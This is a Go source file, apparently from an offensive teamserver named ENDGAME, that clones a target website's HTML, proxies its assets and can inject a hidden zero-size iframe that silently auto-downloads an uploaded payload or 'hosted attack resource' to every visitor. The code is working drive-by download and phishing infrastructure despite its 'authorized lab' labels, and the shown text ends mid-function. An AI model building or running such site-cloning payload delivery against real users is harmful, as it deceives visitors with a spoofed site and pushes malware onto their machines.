package server

// site_clone.go implements the authorized-lab site manager.  A clone keeps
// the original HTML locally, proxies referenced assets through the teamserver
// and can optionally append a hidden download iframe for a file uploaded to
// that site.

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"mime"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode"

	xhtml "golang.org/x/net/html"
)

const (
	siteManifestName = "site.json"
	siteIndexName    = "index.html"
	maxSiteHTML      = 16 << 20
	maxSiteFile      = 256 << 20
	maxSiteAsset     = 32 << 20
)

type siteFile struct {
	Filename  string `json:"filename"`
	Size      int64  `json:"size"`
	CreatedAt string `json:"created_at"`
}

// Site is the public/API representation of a managed clone.
type Site struct {
	Slug         string     `json:"slug"`
	Name         string     `json:"name"`
	SourceURL    string     `json:"source_url"`
	FinalURL     string     `json:"final_url,omitempty"`
	CloneURI     string     `json:"clone_uri,omitempty"`
	LocalHost    string     `json:"local_host,omitempty"`
	LocalPort    int        `json:"local_port,omitempty"`
	CreatedAt    time.Time  `json:"created_at"`
	UpdatedAt    time.Time  `json:"updated_at"`
	PayloadFile  string     `json:"payload_file,omitempty"`
	AttackID     string     `json:"attack_id,omitempty"`
	DownloadName string     `json:"download_name,omitempty"`
	AutoDownload bool       `json:"auto_download"`
	PublicPath   string     `json:"public_path"`
	PublicURL    string     `json:"public_url,omitempty"`
	CloneURL     string     `json:"clone_url,omitempty"`
	Files        []siteFile `json:"files"`
}

type siteManifest struct {
	Site
	AllowedHosts []string `json:"allowed_hosts"`
}

type siteCloneRequest struct {
	Name         string `json:"name"`
	Slug         string `json:"slug"`
	URL          string `json:"url"`
	CloneURI     string `json:"clone_uri"`
	LocalHost    string `json:"local_host"`
	LocalPort    int    `json:"local_port"`
	AttackID     string `json:"attack_id"`
	DownloadName string `json:"download_name"`
}

type siteInjectRequest struct {
	Filename     string `json:"filename"`
	AttackID     string `json:"attack_id"`
	DownloadName string `json:"download_name"`
	AutoDownload *bool  `json:"auto_download"`
	Enabled      *bool  `json:"enabled"`
}

type siteAssetMeta struct {
	ContentType string `json:"content_type"`
}

var siteSlugRE = regexp.MustCompile(`^[a-z0-9][a-z0-9_-]{0,63}$`)
var siteCSSURLRE = regexp.MustCompile(`(?i)url\(\s*(?:"([^"]+)"|'([^']+)'|([^\)"']+))\s*\)`)

func (s *Server) sitesDir() string {
	return filepath.Join(s.cfg.DataDir, "sites")
}

func siteDir(root, slug string) string {
	return filepath.Join(root, slug)
}

func siteFilesDir(root, slug string) string {
	return filepath.Join(siteDir(root, slug), "files")
}

func siteCacheDir(root, slug string) string {
	return filepath.Join(siteDir(root, slug), "cache")
}

func sanitizeSiteSlug(value string) string {
	value = strings.ToLower(strings.TrimSpace(value))
	var b strings.Builder
	lastDash := false
	for _, r := range value {
		switch {
		case r >= 'a' && r <= 'z', r >= '0' && r <= '9':
			b.WriteRune(r)
			lastDash = false
		case r == '-' || r == '_':
			if b.Len() > 0 && !lastDash {
				b.WriteRune(r)
			}
			lastDash = r == '-'
		case unicode.IsSpace(r) || r == '.' || r == '/':
			if b.Len() > 0 && !lastDash {
				b.WriteByte('-')
				lastDash = true
			}
		}
		if b.Len() >= 64 {
			break
		}
	}
	return strings.Trim(b.String(), "-_")
}

func validateSiteSlug(slug string) error {
	if !siteSlugRE.MatchString(slug) {
		return fmt.Errorf("invalid site slug")
	}
	return nil
}

func sanitizeSiteFilename(name string) (string, error) {
	name = strings.TrimSpace(name)
	if name == "" || name == "." || name == ".." || strings.Contains(name, "..") ||
		strings.ContainsAny(name, "/\\\\\r\n") {
		return "", fmt.Errorf("invalid filename")
	}
	for _, r := range name {
		if unicode.IsControl(r) {
			return "", fmt.Errorf("invalid filename")
		}
	}
	name = filepath.Base(name)
	if name == "" || name == "." || name == siteManifestName || name == siteIndexName {
		return "", fmt.Errorf("filename is reserved")
	}
	if len(name) > 128 {
		return "", fmt.Errorf("filename too long")
	}
	return name, nil
}

func siteHostKey(u *url.URL) string {
	return strings.ToLower(strings.TrimSpace(u.Host))
}

func siteAssetURL(slug string, target *url.URL) string {
	encoded := base64.RawURLEncoding.EncodeToString([]byte(target.String()))
	return "/site/" + slug + "/asset?u=" + encoded
}

func siteTargetURL(raw string, base *url.URL) (*url.URL, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" || strings.HasPrefix(raw, "#") || strings.HasPrefix(raw, "data:") ||
		strings.HasPrefix(raw, "javascript:") || strings.HasPrefix(raw, "mailto:") ||
		strings.HasPrefix(raw, "tel:") || strings.HasPrefix(raw, "blob:") {
		return nil, nil
	}
	target, err := url.Parse(raw)
	if err != nil {
		return nil, err
	}
	if base != nil {
		target = base.ResolveReference(target)
	}
	if target.Scheme != "http" && target.Scheme != "https" || target.Host == "" {
		return nil, nil
	}
	target.Fragment = ""
	return target, nil
}

func rewriteSiteAssetReference(raw, slug string, base *url.URL, allowedHosts map[string]bool) string {
	target, err := siteTargetURL(raw, base)
	if err != nil || target == nil {
		return raw
	}
	allowedHosts[siteHostKey(target)] = true
	return siteAssetURL(slug, target)
}

func rewriteSiteSrcset(value, slug string, base *url.URL, allowedHosts map[string]bool) string {
	parts := strings.Split(value, ",")
	for i, part := range parts {
		fields := strings.Fields(part)
		if len(fields) == 0 {
			continue
		}
		raw := fields[0]
		if strings.HasPrefix(strings.ToLower(raw), "data:") {
			continue
		}
		fields[0] = rewriteSiteAssetReference(raw, slug, base, allowedHosts)
		parts[i] = strings.Join(fields, " ")
	}
	return strings.Join(parts, ", ")
}

// rewriteSiteHTML changes asset references to the clone's same-origin asset
// proxy. Navigation links are deliberately left untouched.
func rewriteSiteHTML(data []byte, slug string, base *url.URL, allowedHosts map[string]bool) ([]byte, error) {
	doc, err := xhtml.Parse(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	var walk func(*xhtml.Node)
	walk = func(n *xhtml.Node) {
		if n.Type == xhtml.ElementNode {
			tag := strings.ToLower(n.Data)
			for i := range n.Attr {
				attr := &n.Attr[i]
				if attr.Key == "srcset" && map[string]bool{"img": true, "source": true}[tag] {
					attr.Val = rewriteSiteSrcset(attr.Val, slug, base, allowedHosts)
					continue
				}
				isAsset := attr.Key == "src" && map[string]bool{
					"img": true, "script": true, "iframe": true, "frame": true,
					"source": true, "video": true, "audio": true, "track": true,
				}[tag]
				if tag == "link" && attr.Key == "href" {
					for _, rel := range n.Attr {
						if rel.Key == "rel" && strings.Contains(strings.ToLower(rel.Val), "stylesheet") {
							isAsset = true
						}
					}
				}
				if !isAsset {
					continue
				}
				attr.Val = rewriteSiteAssetReference(attr.Val, slug, base, allowedHosts)
			}
			// A <base> tag would make browser resolution disagree with the
			// rewritten absolute clone paths, so remove it from the copy.
			if tag == "base" && n.Parent != nil {
				n.Parent.RemoveChild(n)
				return
			}
		}
		for child := n.FirstChild; child != nil; {
			next := child.NextSibling
			walk(child)
			child = next
		}
	}
	walk(doc)
	var out bytes.Buffer
	if err := xhtml.Render(&out, doc); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

func removeSiteDownload(doc *xhtml.Node) {
	var walk func(*xhtml.Node)
	walk = func(n *xhtml.Node) {
		for child := n.FirstChild; child != nil; {
			next := child.NextSibling
			remove := false
			if child.Type == xhtml.ElementNode {
				for _, attr := range child.Attr {
					if attr.Key == "data-endgame-site-download" && attr.Val == "1" {
						remove = true
						break
					}
				}
			}
			if remove {
				n.RemoveChild(child)
			} else {
				walk(child)
			}
			child = next
		}
	}
	walk(doc)
}

func siteBody(doc *xhtml.Node) *xhtml.Node {
	var body *xhtml.Node
	var htmlNode *xhtml.Node
	var walk func(*xhtml.Node)
	walk = func(n *xhtml.Node) {
		if body != nil {
			return
		}
		if n.Type == xhtml.ElementNode {
			switch strings.ToLower(n.Data) {
			case "body":
				body = n
			case "html":
				htmlNode = n
			}
		}
		for child := n.FirstChild; child != nil; child = child.NextSibling {
			walk(child)
		}
	}
	walk(doc)
	if body != nil {
		return body
	}
	if htmlNode == nil {
		htmlNode = &xhtml.Node{Type: xhtml.ElementNode, Data: "html"}
		doc.AppendChild(htmlNode)
	}
	body = &xhtml.Node{Type: xhtml.ElementNode, Data: "body"}
	htmlNode.AppendChild(body)
	return body
}

func injectSiteDownload(data []byte, downloadPath string) ([]byte, error) {
	doc, err := xhtml.Parse(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	removeSiteDownload(doc)
	body := siteBody(doc)
	body.AppendChild(&xhtml.Node{Type: xhtml.CommentNode, Data: " ENDGAME-SITE-DOWNLOAD "})
	body.AppendChild(&xhtml.Node{
		Type: xhtml.ElementNode,
		Data: "iframe",
		Attr: []xhtml.Attribute{
			{Key: "src", Val: downloadPath},
			{Key: "width", Val: "0"},
			{Key: "height", Val: "0"},
			{Key: "style", Val: "display:none"},
			{Key: "aria-hidden", Val: "true"},
			{Key: "data-endgame-site-download", Val: "1"},
		},
	})
	var out bytes.Buffer
	if err := xhtml.Render(&out, doc); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

func rewriteSiteCSS(data []byte, slug string, base *url.URL, allowedHosts map[string]bool) []byte {
	return siteCSSURLRE.ReplaceAllFunc(data, func(match []byte) []byte {
		parts := siteCSSURLRE.FindSubmatch(match)
		if len(parts) < 4 {
			return match
		}
		rawURL := string(parts[1])
		if rawURL == "" {
			rawURL = string(parts[2])
		}
		if rawURL == "" {
			rawURL = string(parts[3])
		}
		target, err := siteTargetURL(rawURL, base)
		if err != nil || target == nil || !allowedHosts[siteHostKey(target)] {
			return match
		}
		return []byte("url(\"" + siteAssetURL(slug, target) + "\")")
	})
}

func fetchSiteHTML(rawURL string) ([]byte, *url.URL, error) {
	u, err := url.Parse(strings.TrimSpace(rawURL))
	if err != nil || u.Host == "" || (u.Scheme != "http" && u.Scheme != "https") {
		return nil, nil, fmt.Errorf("source URL must use http or https")
	}
	redirects := 0
	client := &http.Client{
		Timeout: 30 * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			redirects++
			if len(via) >= 5 {
				return fmt.Errorf("too many redirects")
			}
			return nil
		},
	}
	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return nil, nil, err
	}
	req.Header.Set("User-Agent", "ENDGAME authorized lab site clone")
	resp, err := client.Do(req)
	if err != nil {
		return nil, nil, fmt.Errorf("clone request: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, nil, fmt.Errorf("clone request: upstream HTTP %d", resp.StatusCode)
	}
	contentType := strings.ToLower(resp.Header.Get("Content-Type"))
	if contentType != "" && !strings.Contains(contentType, "text/html") && !strings.Contains(contentType, "application/xhtml+xml") {
		return nil, nil, fmt.Errorf("source is not HTML (content-type %s)", contentType)
	}
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxSiteHTML+1))
	if err != nil {
		return nil, nil, fmt.Errorf("read clone: %w", err)
	}
	if len(data) > maxSiteHTML {
		return nil, nil, fmt.Errorf("HTML exceeds %d MiB limit", maxSiteHTML/(1<<20))
	}
	finalURL := resp.Request.URL
	if finalURL == nil {
		finalURL = u
	}
	_ = redirects
	return data, finalURL, nil
}

func (s *Server) readSite(slug string) (siteManifest, error) {
	if err := validateSiteSlug(slug); err != nil {
		return siteManifest{}, err
	}
	data, err := os.ReadFile(filepath.Join(siteDir(s.sitesDir(), slug), siteManifestName))
	if err != nil {
		return siteManifest{}, err
	}
	var manifest siteManifest
	if err := json.Unmarshal(data, &manifest); err != nil {
		return siteManifest{}, fmt.Errorf("invalid site manifest: %w", err)
	}
	return manifest, nil
}

func (s *Server) writeSite(manifest siteManifest) error {
	dir := siteDir(s.sitesDir(), manifest.Slug)
	if err := os.MkdirAll(filepath.Join(dir, "files"), 0700); err != nil {
		return err
	}
	if err := os.MkdirAll(siteCacheDir(s.sitesDir(), manifest.Slug), 0700); err != nil {
		return err
	}
	data, err := json.MarshalIndent(manifest, "", "  ")
	if err != nil {
		return err
	}
	tmp := filepath.Join(dir, siteManifestName+".tmp")
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return err
	}
	return os.Rename(tmp, filepath.Join(dir, siteManifestName))
}

func (s *Server) writeSiteIndex(slug string, data []byte) error {
	dir := siteDir(s.sitesDir(), slug)
	tmp := filepath.Join(dir, siteIndexName+".tmp")
	if err := os.WriteFile(tmp, data, 0600); err != nil {
		return err
	}
	return os.Rename(tmp, filepath.Join(dir, siteIndexName))
}

func (s *Server) siteFiles(slug string) ([]siteFile, error) {
	entries, err := os.ReadDir(siteFilesDir(s.sitesDir(), slug))
	if err != nil {
		if os.IsNotExist(err) {
			return []siteFile{}, nil
		}
		return nil, err
	}
	files := make([]siteFile, 0, len(entries))
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		files = append(files, siteFile{
			Filename: entry.Name(), Size: info.Size(), CreatedAt: info.ModTime().UTC().Format(time.RFC3339),
		})
	}
	sort.Slice(files, func(i, j int) bool { return files[i].Filename < files[j].Filename })
	return files, nil
}

func (s *Server) publicSite(manifest siteManifest) Site {
	manifest.Site.Files, _ = s.siteFiles(manifest.Slug)
	manifest.Site.PublicPath = "/site/" + manifest.Slug + "/"
	manifest.Site.PublicURL = s.sitePublicURL(manifest.Slug)
	manifest.Site.CloneURL = s.siteCloneURL(manifest)
	return manifest.Site
}

func (s *Server) sitePublicURL(slug string) string {
	return httpURL(s.publicHTTPHost(), s.publicHTTPPort(), "/site/"+url.PathEscape(slug)+"/")
}

func (s *Server) siteClonePath(manifest siteManifest) string {
	uri := manifest.CloneURI
	if uri == "" {
		uri = "/"
	}
	return "/site/" + url.PathEscape(manifest.Slug) + uri
}

func (s *Server) siteCloneURL(manifest siteManifest) string {
	host := manifest.LocalHost
	if host == "" {
		host = s.publicHTTPHost()
	}
	port := manifest.LocalPort
	if port == 0 {
		port = s.publicHTTPPort()
	}
	return httpURL(host, port, s.siteClonePath(manifest))
}

func (s *Server) apiSites(w http.ResponseWriter, r *http.Request) {
	sub := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/sites"), "/")
	if sub == "" {
		if r.Method != http.MethodGet {
			jsonErr(w, "use POST /api/sites/clone to create a site", http.StatusMethodNotAllowed)
			return
		}
		entries, err := os.ReadDir(s.sitesDir())
		if err != nil && !os.IsNotExist(err) {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		out := make([]Site, 0)
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			manifest, err := s.readSite(entry.Name())
			if err != nil {
				continue
			}
			out = append(out, s.publicSite(manifest))
		}
		sort.Slice(out, func(i, j int) bool { return out[i].Slug < out[j].Slug })
		jsonOK(w, out)
		return
	}

	parts := strings.Split(sub, "/")
	if parts[0] == "clone" && r.Method == http.MethodPost && len(parts) == 1 {
		s.apiSiteClone(w, r)
		return
	}
	slug := parts[0]
	if len(parts) == 1 && r.Method == http.MethodGet {
		manifest, err := s.readSite(slug)
		if err != nil {
			jsonErr(w, "site not found", http.StatusNotFound)
			return
		}
		jsonOK(w, s.publicSite(manifest))
		return
	}
	if len(parts) == 1 && r.Method == http.MethodDelete {
		if err := validateSiteSlug(slug); err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		s.sitesMu.Lock()
		if _, err := os.Stat(siteDir(s.sitesDir(), slug)); os.IsNotExist(err) {
			s.sitesMu.Unlock()
			jsonErr(w, "site not found", http.StatusNotFound)
			return
		}
		if err := os.RemoveAll(siteDir(s.sitesDir(), slug)); err != nil {
			s.sitesMu.Unlock()
			jsonErr(w, "delete site: "+err.Error(), http.StatusInternalServerError)
			return
		}
		s.sitesMu.Unlock()
		jsonOK(w, map[string]string{"slug": slug, "status": "deleted"})
		return
	}
	if len(parts) >= 2 && parts[1] == "files" {
		s.apiSiteFiles(w, r, slug, parts[2:])
		return
	}
	if len(parts) == 2 && parts[1] == "inject" && r.Method == http.MethodPost {
		s.apiSiteInject(w, r, slug)
		return
	}
	jsonErr(w, "unknown site endpoint", http.StatusNotFound)
}

func (s *Server) apiSiteClone(w http.ResponseWriter, r *http.Request) {
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req siteCloneRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonErr(w, "invalid JSON: "+err.Error(), http.StatusBadRequest)
		return
	}
	if strings.TrimSpace(req.URL) == "" {
		jsonErr(w, "url required", http.StatusBadRequest)
		return
	}
	data, finalURL, err := fetchSiteHTML(req.URL)
	if err != nil {
		jsonErr(w, err.Error(), http.StatusBadGateway)
		return
	}
	slug := sanitizeSiteSlug(req.Slug)
	if slug == "" {
		slug = sanitizeSiteSlug(req.Name)
	}
	if slug == "" {
		slug = sanitizeSiteSlug(finalURL.Hostname())
	}
	if slug == "" {
		jsonErr(w, "could not derive site slug", http.StatusBadRequest)
		return
	}
	if err := validateSiteSlug(slug); err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	cloneURI, err := normalizeHostedURI(req.CloneURI)
	if err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	localHost, err := normalizeHostedHost(req.LocalHost)
	if err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	localPortText := ""
	if req.LocalPort != 0 {
		localPortText = strconv.Itoa(req.LocalPort)
	}
	localPort, err := normalizeHostedPort(localPortText, s.publicHTTPPort())
	if err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	var attack hostedFile
	if strings.TrimSpace(req.AttackID) != "" {
		attack, err = s.findHosted(strings.TrimSpace(req.AttackID))
		if err != nil {
			jsonErr(w, "hosted attack resource not found", http.StatusNotFound)
			return
		}
	}

	s.sitesMu.Lock()
	defer s.sitesMu.Unlock()
	dir := siteDir(s.sitesDir(), slug)
	if _, err := os.Stat(dir); err == nil {
		jsonErr(w, "site slug already exists", http.StatusConflict)
		return
	} else if !os.IsNotExist(err) {
		jsonErr(w, "check site: "+err.Error(), http.StatusInternalServerError)
		return
	}
	if err := os.MkdirAll(siteFilesDir(s.sitesDir(), slug), 0700); err != nil {
		jsonErr(w, "create site: "+err.Error(), http.StatusInternalServerError)
		return
	}
	allowed := map[string]bool{siteHostKey(finalURL): true}
	rewritten, err := rewriteSiteHTML(data, slug, finalURL, allowed)
	if err != nil {
		jsonErr(w, "rewrite HTML: "+err.Error(), http.StatusBadRequest)
		return
	}
	if err := s.writeSiteIndex(slug, rewritten); err != nil {
		_ = os.RemoveAll(dir)
		jsonErr(w, "write clone: "+err.Error(), http.StatusInternalServerError)
		return
	}
	name := strings.TrimSpace(req.Name)
	if name == "" {
		name = slug
	}
	now := time.Now().UTC()
	manifest := siteManifest{
		Site: Site{
			Slug: slug, Name: name, SourceURL: strings.TrimSpace(req.URL), FinalURL: finalURL.String(),
			CloneURI: cloneURI, LocalHost: localHost, LocalPort: localPort,
			CreatedAt: now, UpdatedAt: now, PublicPath: "/site/" + slug + "/", Files: []siteFile{},
		},
		AllowedHosts: sortedKeys(allowed),
	}
	if err := s.writeSite(manifest); err != nil {
		_ = os.RemoveAll(dir)
		jsonErr(w, "write manifest: "+err.Error(), http.StatusInternalServerError)
		return
	}
	if attack.ID != "" {
		if err := s.updateSiteHostedInjection(slug, manifest, attack, req.DownloadName); err != nil {
			_ = os.RemoveAll(dir)
			jsonErr(w, "apply attack resource: "+err.Error(), http.StatusInternalServerError)
			return
		}
		manifest, _ = s.readSite(slug)
	}
	s.printf("[site] cloned %s → /site/%s/\n", finalURL.String(), slug)
	jsonOK(w, s.publicSite(manifest))
}

func sortedKeys(values map[string]bool) []string {
	keys := make([]string, 0, len(values))
	for key, ok := range values {
		if ok && key != "" {
			keys = append(keys, key)
		}
	}
	sort.Strings(keys)
	return keys
}

func (s *Server) apiSiteFiles(w http.ResponseWriter, r *http.Request, slug string, rest []string) {
	if _, err := s.readSite(slug); err != nil {
		jsonErr(w, "site not found", http.StatusNotFound)
		return
	}
	if len(rest) == 0 && r.Method == http.MethodGet {
		files, err := s.siteFiles(slug)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		jsonOK(w, files)
		return
	}
	if len(rest) == 0 && r.Method == http.MethodPost {
		r.Body = http.MaxBytesReader(w, r.Body, maxSiteFile+1)
		if err := r.ParseMultipartForm(maxSiteFile); err != nil {
			jsonErr(w, "parse upload: "+err.Error(), http.StatusBadRequest)
			return
		}
		file, header, err := r.FormFile("file")
		if err != nil {
			jsonErr(w, "file field required", http.StatusBadRequest)
			return
		}
		defer file.Close()
		name, err := sanitizeSiteFilename(header.Filename)
		if err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		data, err := io.ReadAll(io.LimitReader(file, maxSiteFile+1))
		if err != nil {
			jsonErr(w, "read upload: "+err.Error(), http.StatusBadRequest)
			return
		}
		if len(data) > maxSiteFile {
			jsonErr(w, "file exceeds 256 MiB limit", http.StatusRequestEntityTooLarge)
			return
		}
		s.sitesMu.Lock()
		if err := os.WriteFile(filepath.Join(siteFilesDir(s.sitesDir(), slug), name), data, 0600); err != nil {
			s.sitesMu.Unlock()
			jsonErr(w, "write upload: "+err.Error(), http.StatusInternalServerError)
			return
		}
		s.sitesMu.Unlock()
		jsonOK(w, siteFile{Filename: name, Size: int64(len(data)), CreatedAt: time.Now().UTC().Format(time.RFC3339)})
		return
	}
	if len(rest) == 1 && r.Method == http.MethodDelete {
		name, err := sanitizeSiteFilename(rest[0])
		if err != nil {
			jsonErr(w, err.Error(), http.StatusBadRequest)
			return
		}
		s.sitesMu.Lock()
		manifest, manifestErr := s.readSite(slug)
		if manifestErr != nil {
			s.sitesMu.Unlock()
			jsonErr(w, "site not found", http.StatusNotFound)
			return
		}
		if manifest.PayloadFile == name {
			if err := s.updateSiteInjection(slug, manifest, "", "", false); err != nil {
				s.sitesMu.Unlock()
				jsonErr(w, "remove download injection: "+err.Error(), http.StatusInternalServerError)
				return
			}
		}
		if err := os.Remove(filepath.Join(siteFilesDir(s.sitesDir(), slug), name)); err != nil {
			if os.IsNotExist(err) {
				jsonErr(w, "file not found", http.StatusNotFound)
			} else {
				jsonErr(w, "delete file: "+err.Error(), http.StatusInternalServerError)
			}
			s.sitesMu.Unlock()
			return
		}
		s.sitesMu.Unlock()
		jsonOK(w, map[string]string{"filename": name, "status": "deleted"})
		return
	}
	jsonErr(w, "unknown site files endpoint", http.StatusNotFound)
}

func (s *Server) apiSiteInject(w http.ResponseWriter, r *http.Request, slug string) {
	manifest, err := s.readSite(slug)
	if err != nil {
		jsonErr(w, "site not found", http.StatusNotFound)
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req siteInjectRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		jsonErr(w, "invalid JSON: "+err.Error(), http.StatusBadRequest)
		return
	}
	enabled := true
	if req.AutoDownload != nil {
		enabled = *req.AutoDownload
	}
	if req.Enabled != nil {
		enabled = *req.Enabled
	}
	if !enabled {
		s.sitesMu.Lock()
		if err := s.updateSiteInjection(slug, manifest, "", "", false); err != nil {
			s.sitesMu.Unlock()
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		updated, _ := s.readSite(slug)
		s.sitesMu.Unlock()
		jsonOK(w, s.publicSite(updated))
		return
	}
	if strings.TrimSpace(req.AttackID) != "" {
		attack, attackErr := s.findHosted(strings.TrimSpace(req.AttackID))
		if attackErr != nil {
			jsonErr(w, "hosted attack resource not found", http.StatusNotFound)
			return
		}
		s.sitesMu.Lock()
		if err := s.updateSiteHostedInjection(slug, manifest, attack, req.DownloadName); err != nil {
			s.sitesMu.Unlock()
			jsonErr(w, err.Error(), http.StatusInternalServerError)
			return
		}
		updated, _ := s.readSite(slug)
		s.sitesMu.Unlock()
		jsonOK(w, s.publicSite(updated))
		return
	}
	filename, err := sanitizeSiteFilename(req.Filename)
	if err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	if _, err := os.Stat(filepath.Join(siteFilesDir(s.sitesDir(), slug), filename)); err != nil {
		jsonErr(w, "uploaded file not found", http.StatusNotFound)
		return
	}
	downloadName := strings.TrimSpace(req.DownloadName)
	if downloadName == "" {
		downloadName = filename
	}
	downloadName, err = sanitizeSiteFilename(downloadName)
	if err != nil {
		jsonErr(w, err.Error(), http.StatusBadRequest)
		return
	}
	s.sitesMu.Lock()
	if err := s.updateSiteInjection(slug, manifest, filename, downloadName, true); err != nil {
		s.sitesMu.Unlock()
		jsonErr(w, err.Error(), http.StatusInternalServerError)
		return
	}
	updated, _ := s.readSite(slug)
	s.sitesMu.Unlock()
	jsonOK(w, s.publicSite(updated))
}

func (s *Server) updateSiteInjection(slug string, manifest siteManifest, filename, downloadName string, enabled bool) error {
	data, err := os.ReadFile(filepath.Join(siteDir(s.sitesDir(), slug), siteIndexName))
	if err != nil {
		return fmt.Errorf("read clone: %w", err)
	}
	var updated []byte
	if enabled {
		path := "/site/" + slug + "/download/" + url.PathEscape(downloadName)
		updated, err = injectSiteDownload(data, path)
	} else {
		doc, parseErr := xhtml.Parse(bytes.NewReader(data))
		if parseErr != nil {
			return fmt.Errorf("parse clone: %w", parseErr)
		}
		removeSiteDownload(doc)
		var out bytes.Buffer
		err = xhtml.Render(&out, doc)
		updated = out.Bytes()
	}
	if err != nil {
		return fmt.Errorf("update clone: %w", err)
	}
	if err := s.writeSiteIndex(slug, updated); err != nil {
		return fmt.Errorf("write clone: %w", err)
	}
	manifest.PayloadFile = ""
	manifest.AttackID = ""
	manifest.DownloadName = ""
	manifest.AutoDownload = enabled
	if enabled {
		manifest.PayloadFile = filename
		manifest.DownloadName = downloadName
	}
	manifest.UpdatedAt = time.Now().UTC()
	return s.writeSite(manifest)
}

func (s *Server) updateSiteHostedInjection(slug string, manifest siteManifest, attack hostedFile, downloadName string) error {
	data, err := os.ReadFile(filepath.Join(siteDir(s.sitesDir(), slug), siteIndexName))
	if err != nil {
		return fmt.Errorf("read clone: %w", err)
	}
	if downloadName = strings.TrimSpace(downloadName); downloadName == "" {
		downloadName = attack.Filename
	}
	if downloadName, err = sanitizeSiteFilename(downloadName); err != nil {
		return err
	}
	updated, err := injectSiteDownload(data, s.hostedPublicPath(attack))
	if err != nil {
		return fmt.Errorf("update clone: %w", err)
	}
	if err := s.writeSiteIndex(slug, updated); err != nil {
		return fmt.Errorf("write clone: %w", err)
	}
	manifest.PayloadFile = ""
	manifest.AttackID = attack.ID
	manifest.DownloadName = downloadName
	manifest.AutoDownload = true
	manifest.UpdatedAt = time.Now().UTC()
	return s.writeSite(manifest)
}

func siteCloneURIEquals(cloneURI, rest string) bool {
	normalized, err := normalizeHostedURI("/" + rest)
	return err == nil && normalized == cloneURI
}

func (s *Server) handleSitePublic(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet && r.Method != http.MethodHead {
		w.Header().Set("Allow", "GET, HEAD")
		w.WriteHeader(http.StatusMethodNotAllowed)
		return
	}
	sub := strings.TrimPrefix(r.URL.Path, "/site/")
	parts := strings.SplitN(sub, "/", 2)
	slug := parts[0]
	if err := validateSiteSlug(slug); err != nil {
		http.NotFound(w, r)
		return
	}
	manifest, err := s.readSite(slug)
	if err != nil {
		http.NotFound(w, r)
		return
	}
	rest := ""
	if len(parts) == 2 {
		rest = parts[1]
	}
	switch {
	case rest == "" || rest == siteIndexName:
		data, err := os.ReadFile(filepath.Join(siteDir(s.sitesDir(), slug), siteIndexName))
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		_, _ = w.Write(data)
	case manifest.CloneURI != "" && siteCloneURIEquals(manifest.CloneURI, rest):
		data, err := os.ReadFile(filepath.Join(siteDir(s.sitesDir(), slug), siteIndexName))
		if err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		w.Header().Set("Cache-Control", "no-store")
		_, _ = w.Write(data)
	case rest == "asset":
		s.serveSiteAsset(w, r, manifest)
	case strings.HasPrefix(rest, "download/"):
		name, err := url.PathUnescape(strings.TrimPrefix(rest, "download/"))
		if err != nil {
			http.NotFound(w, r)
			return
		}
		name, err = sanitizeSiteFilename(name)
		if err != nil || manifest.PayloadFile == "" || name != manifest.DownloadName {
			http.NotFound(w, r)
			return
		}
		filePath := filepath.Join(siteFilesDir(s.sitesDir(), slug), manifest.PayloadFile)
		if _, err := os.Stat(filePath); err != nil {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		if disposition := mime.FormatMediaType("attachment", map[string]string{"filename": name}); disposition != "" {
			w.Header().Set("Content-Disposition", disposition)
		}
		w.Header().Set("X-Content-Type-Options", "nosniff")
		w.Header().Set("Cache-Control", "no-store")
		http.ServeFile(w, r, filePath)
	default:
		http.NotFound(w, r)
	}
}

func (s *Server) serveSiteAsset(w http.ResponseWriter, r *http.Request, manifest siteManifest) {
	encoded := strings.TrimSpace(r.URL.Query().Get("u"))
	raw, err := base64.RawURLEncoding.DecodeString(encoded)
	if err != nil {
		http.Error(w, "invalid asset", http.StatusBadRequest)
		return
	}
	target, err := url.Parse(string(raw))
	if err != nil || (target.Scheme != "http" && target.Scheme != "https") || target.Host == "" {
		http.Error(w, "invalid asset", http.StatusBadRequest)
		return
	}
	allowed := false
	for _, host := range manifest.AllowedHosts {
		if strings.EqualFold(host, siteHostKey(target)) {
			allowed = true
			break
		}
	}
	if !allowed {
		http.Error(w, "asset host not allowed", http.StatusForbidden)
		return
	}
